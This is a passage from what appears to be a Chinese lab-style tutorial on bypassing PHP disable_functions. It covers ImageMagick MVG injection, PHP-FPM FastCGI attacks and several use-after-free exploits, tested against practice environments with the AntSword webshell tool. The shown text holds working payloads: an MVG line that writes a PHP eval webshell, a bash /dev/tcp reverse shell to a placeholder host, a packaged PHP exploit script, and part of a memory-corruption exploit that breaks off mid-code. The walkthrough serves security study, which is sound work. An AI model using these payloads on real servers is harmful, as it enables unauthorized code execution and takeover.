operator">+</span>ofFC6xv3ZpxJiywakzbvd9r3RWPS9I2<span class="token operator">+</span>MWk0<span class="token operator">+</span>kbf0Hih9Y17U0nTHibrDDQ0NDQ0NDQ0NDQ0NDQ0NTXbRSL<span class="token operator">/</span>AK72o6GhoaGhoRlL8951vwsNDQ0NDQ1NDc0WyHtDTEhDQ0NDQ0NTS5MdGhoaGhoaGhoaGhoaGhoaGhoaGhoaGposzSHAAErMwwQ2HwRQAAAAAElFTkSuQmCC"<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token variable">$base64</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token variable">$imageBlob</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$base64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$imagick</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$imagick</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token variable">$imageBlob</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: image/png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$imageBlob</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">readImageBlob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说我们要通过以post的方式img去传递，把我们的payload编码传递进去，然后执行</p><p><strong>写一句话木马payload</strong></p><pre><code>push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/1.jpg"|echo \'&lt;?php @eval($_POST[\'ant\']);?&gt;\' &gt; shell.php")'pop graphic-context</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008171433237.png" alt="img"></p><p>可以看到已经成功写入了</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008171452306.png" alt="img"></p><p>上蚁剑连接</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/clipboard.png" alt="img"></p><p>无奈报错，但是我加了一下权限，能连接上了…..</p><pre><code>push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/1.jpg"|chmod 777 shell.php")'pop graphic-context</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008175709879.png" alt="img"></p><p><strong>反弹shell</strong></p><pre><code>push graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/1.jpg"|bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1")'pop graphic-context</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/008180356263.png" alt="img"></p><p>成功拿到了shell</p><p>集成的exp </p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"Disable Functions: "</span> <span class="token punctuation">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'disable_functions'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$command</span> <span class="token operator">=</span> <span class="token constant">PHP_SAPI</span> <span class="token operator">==</span> <span class="token string">'cli'</span> <span class="token operator">?</span> <span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$command</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string">'id'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$exploit</span> <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>push graphic<span class="token operator">-</span>contextviewbox <span class="token number">0</span> <span class="token number">0</span> <span class="token number">640</span> <span class="token number">480</span>fill '<span class="token function">url</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//example.com/image.jpg"|$command")'</span>pop graphic<span class="token operator">-</span>context<span class="token constant">EOF</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"KKKK.mvg"</span><span class="token punctuation">,</span> <span class="token variable">$exploit</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readImage</span><span class="token punctuation">(</span><span class="token string">'KKKK.mvg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeImage</span><span class="token punctuation">(</span><span class="token string">'KKKK.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$thumb</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"KKKK.mvg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"KKKK.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用攻击PHP-FPM"><a href="#利用攻击PHP-FPM" class="headerlink" title="利用攻击PHP-FPM"></a><strong>利用攻击PHP-FPM</strong></h3><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a><strong>使用条件</strong></h4><ul><li>Linux 操作系统</li><li>PHP-FPM</li><li>存在可写的目录，需要上传 .so 文件</li></ul><p>像php-fpm很常见的未授权，授权，然后命令执行，ssrf去攻击等</p><p>先来看看回顾一下什么是CGI和apache的Mod CGI</p><p>因为在早期的web服务器中，所请求的都是http静态资源，存储在服务器上面，请求完之后再返回给服务器，而后来出现动态的脚本像PHP，那么web处理不了，于是就出现了CGI，而这CGI是服务器去FORK一个新的进程去启动的，然后处理动态脚本，最后在kill掉，效率自然而然比较低下。</p><p>Mod CGI 是Web 服务器可以内置 Perl 解释器或 PHP 解释器，做成一个模块，也就是说不用再去FORK一个新进程，就会自动启动</p><p>参考P牛的<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#fastcgi-record" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#fastcgi-record</a></p><h4 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a><strong>FastCGI</strong></h4><p>当然有了CGI，自然是解决了web服务器和php解释器之间的通信问题，然而还有一个效率低下的问题，就是需要创建进程启动CGI。后来就出现了FastCGI，跟CGI相比它启动完进程之后，不会再杀死进程，也就是可以一个请求实现多用。</p><p>它其实也是一种协议，针对http协议而言，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议</p><p>而http协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器</p><h4 id="FastCGI-record"><a href="#FastCGI-record" class="headerlink" title="FastCGI record"></a><strong>FastCGI record</strong></h4><p>fastcgi是由多个record构成的，而fastcgi也是有header和body的。服务器中间件将这两个封装好打包发送给某个语言后端，语言后端接受到之后进行指定的操作，再按照原来的封装发送给服务器中间件</p><p>来看看固定头的8个字节</p><pre><code>typedef struct {/* Header */unsigned char version; // 版本unsigned char type; // 本次record的类型unsigned char requestIdB1; // 本次record对应的请求idunsigned char requestIdB0;unsigned char contentLengthB1; // body体的大小unsigned char contentLengthB0;unsigned char paddingLength; // 额外块大小unsigned char reserved;/* Body */unsigned char contentData[contentLength];unsigned char paddingData[paddingLength];} FCGI_Record;</code></pre><h4 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a><strong>php-fpm</strong></h4><p>简单来说就是fastcgi的解释器，映照了前面说的，中间件服务器将封装好的数据包以TCP的形式发送给后端，就是发送给了fpm。</p><p>比如举个例子，用户访问 <a href="http://127.0.0.1/index.php?a=1&amp;b=2" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=1&amp;b=2</a> 时，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：</p><pre><code>{ 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': "localhost", 'SERVER_PROTOCOL': 'HTTP/1.1'}</code></pre><p>其实phpcgi的攻击就是利用了php-fpm会去读取SCRIPT_FILENAME,这里也不做过多详解，主要就是PHP_VALUE和PHP_ADMIN_VALUE是PHP-FPM的两个环境变量，通过设置这两个让auto_prepend_file = php://input且allow_url_include = On</p><p>那么怎么设置？我们可以直接在报文中添加这两个PHP-FPM的环境变量来进行设置（直接看最后两行）</p><pre><code>{ 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': "localhost", 'SERVER_PROTOCOL': 'HTTP/1.1' 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On'}</code></pre><p>看到在报文里面多了两个。但是SCRIPT_FILENAME选项需要我们设置一个服务端已存在的PHP文件，该选项是让PHP-FPM执行目标服务器上的文件，且由于security.limit_extensions项的限制导致只能执行PHP文件。</p><p>如果有环境可以直接</p><pre><code>find / -name *.php</code></pre><p>还有一个常见的</p><pre><code>/usr/local/lib/php/PEAR.php</code></pre><h4 id="如何构造攻击"><a href="#如何构造攻击" class="headerlink" title="如何构造攻击"></a><strong>如何构造攻击</strong></h4><p>默认的FPM的端口是9000，那么我们可以绕过web服务器，构造fastcgi协议，直接与fpm进行通信，同理就可以用我们的webshell达到绕过。</p><p>但是有3个限制</p><h5 id="一："><a href="#一：" class="headerlink" title="一："></a><strong>一：</strong></h5><p>在php-fpm里面已经讲到了，fpm的执行与SCRIPT_FILENAME有关，它是去执行这个路径下的文件的，但是如果这个路径下的文件不存在，那么就会返回404，所以我们得保证这个路径下得文件存在。常见的一个/usr/local/lib/php/PEAR.php。剩下的可以自己去找，前提是必须存在</p><h5 id="二："><a href="#二：" class="headerlink" title="二："></a><strong>二：</strong></h5><p>单单执行目标上面的文件还是不够，因为我们想要执行的是我们想要执行的文件，那么在php.ini中就有两个可以让我们执行任意的命令</p><p>auto_prepend_file 和 auto_append_file 。</p><p>auto_prepend_file的意思就是告诉PHP在执行目标文件之前，先包含auto_prepend_file中指定的文件，并且auto_prepend_file可以使用PHP伪协议；auto_append_file选项同理，区别在于执行目标文件之后才会包含指定文件。</p><p>所以我们设置auto_prepend_file 为php://input，那么就等于在执行任何 PHP 文件前都要包含一遍 POST 过去的内容。所以，只需要把待执行的代码放在 POST Body 中进行远程文件包含，这样就能做到任意代码执行了</p><h5 id="三："><a href="#三：" class="headerlink" title="三："></a><strong>三：</strong></h5><p>还有一个是allow_url_include，因为需要用到包含，而这个也是必须，如果不为ON是没办法利用的。当然这就用到了上面讲的PHP_VALUE和PHP_ADMIN_VALUE这两个fpm的环境变量，PHP_VALUE可以用来设置 php.ini，PHP_ADMIN_VALUE 则可以设置所有选项（disable_functions 选项除外）</p><p>最后的构造就是php-fpm里面的最后一个报文形式</p><p>攻击fpm的exp：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a><strong>攻击</strong></h4><p>启动我们的蚁剑环境</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009140339573.png" alt="img"></p><p>打开phpinfo查看</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009140516033.png" alt="img"></p><p>FastCGI模式，CGI模式是CGI/FastCGI</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141513573.png" alt="img"></p><p>注意该模式下需要选择 PHP-FPM 的接口地址，需要自行找配置文件查 FPM 接口地址，默认的是 unix:/// 本地 Socket 这种的，如果配置成 TCP 的默认是 127.0.0.1:9000</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141950988.png" alt="img"></p><p>点击开始，上传成功</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141642131.png" alt="img"></p><p>这时候我们就可以在/var/www/html下看到创建的shell</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009141815342.png" alt="img"></p><p>之后回到蚁剑的首页创建一个副本，并且改名</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009142419760.png" alt="img"></p><p>然后打开终端就可以执行命令</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009142349345.png" alt="img"></p><h3 id="利用-GC-UAF"><a href="#利用-GC-UAF" class="headerlink" title="利用 GC UAF"></a><strong>利用 GC UAF</strong></h3><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 - all versions to date</li></ul><p>exp:<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>此漏洞利用 PHP 垃圾收集器中存在三年的一个 <a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">bug</a> ，通过PHP垃圾收集器中<strong>堆溢出</strong>来绕过 disable_functions 并执行系统命令</p><p><strong>攻击</strong></p><p>还是蚁剑的靶场，打开蚁剑</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009144749904.png" alt="img"></p><p>点击开始会跳出来一个新的终端</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009144820119.png" alt="img"></p><p>来看看exp的使用</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009145242413.png" alt="img"></p><p>在exp里面有一个pwn，里面放着我们想要执行的命令，当然一个个换肯定麻烦，可以修改为</p><pre><code>pwn("$_POST[cmd]");  </code></pre><p>就可以以POST的形式传递了</p><h3 id="利用-Backtrace-UAF"><a href="#利用-Backtrace-UAF" class="headerlink" title="利用 Backtrace UAF"></a><strong>利用 Backtrace UAF</strong></h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><p>原理：该漏洞利用在debug_backtrace()函数中使用了两年的一个 <a href="https://bugs.php.net/bug.php?id=76047" target="_blank" rel="noopener">bug</a>。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞。</p><p>exp：<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p><p>这个脚本跟上面的GC一样，也是修改pwn的位置</p><p>利用方式相同，有可以上传执行并且能访问的目录，就直接上传，不行就，上传到tmp目录或者别的能上传的，然后利用文件包含</p><pre><code>include("/tmp/xxx.php");&amp;cmd=xxx</code></pre><h3 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a><strong>Json Serializer UAF</strong></h3><h4 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a><strong>使用条件：</strong></h4><ul><li><p>Linux 操作系统</p></li><li><p>PHP 版本</p></li><li><ul><li>7.1 - all versions to date</li><li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul></li></ul><p>原理：</p><p>此漏洞利用json序列化程序中的释放后使用<a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener">漏洞</a>，利用json序列化程序中的堆溢出触发，以绕过 disable_functions 和执行系统命令。尽管不能保证成功，但它应该相当可靠的在所有服务器 api上使用</p><p>exp:<a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p><p>同样的方式修改exp</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009150502762.png" alt="img"></p><p>修改</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009150608392.png" alt="img"></p><p>上传</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009151002843.png" alt="img"></p><p>或者用蚁剑自带的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009151054097.png" alt="img"></p><p>执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009151106742.png" alt="img"></p><h3 id="利用-SplDoublyLinkedList-UAC"><a href="#利用-SplDoublyLinkedList-UAC" class="headerlink" title="利用 SplDoublyLinkedList UAC"></a><strong>利用 SplDoublyLinkedList UAC</strong></h3><h4 id="使用条件：-1"><a href="#使用条件：-1" class="headerlink" title="使用条件："></a><strong>使用条件：</strong></h4><ul><li><p>PHP 版本</p></li><li><ul><li>PHP v7.4.10及其之前版本</li><li>PHP v8.0（Alpha）</li></ul></li></ul><p>详细介绍：<a href="https://www.freebuf.com/articles/web/251017.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/251017.html</a></p><p>原理：</p><p>PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等</p><p>这里用了<a href="http://bmzclub.cn/" target="_blank" rel="noopener">bmzclub</a>的ezphp来进行实验</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009155419275.png" alt="img"></p><p>传入的命令不能超过25</p><p>先查看一下phpinfo看看disable_functions</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009155643262.png" alt="img"></p><p>可以看到禁用了很多</p><p>但是有一个姿势可以绕过长度的限制</p><pre><code>a=eval($_POST[1]);1=system('ls')</code></pre><p>但是这里限制了不能利用，所以就需要绕过disable_functions</p><p>连接蚁剑</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009160914089.png" alt="img"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009160932156.png" alt="img"></p><p>终端执行</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009175308700.png" alt="img"></p><p><a href="https://xz.aliyun.com/t/8355#toc-3" target="_blank" rel="noopener">exp</a></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009175854506.png" alt="img"></p><p>脚本的这个位置时间修改flag的</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">120</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token variable">$x</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$j</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$i</span> <span class="token operator">></span><span class="token operator">>=</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$result</span> <span class="token operator">&lt;</span><span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>     <span class="token variable">$result</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$address</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getPHPChunk</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string">'/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /'</span><span class="token punctuation">;</span>  <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$maps</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token variable">$end</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0x200000</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$length</span> <span class="token operator">&lt;=</span> <span class="token number">0x300000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">s2i</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">echo</span> <span class="token string">"[+]PHP Chunk: "</span> <span class="token punctuation">.</span> <span class="token variable">$start</span> <span class="token punctuation">.</span> <span class="token string">" - "</span> <span class="token punctuation">.</span> <span class="token variable">$end</span> <span class="token punctuation">.</span> <span class="token string">", length: 0x"</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>   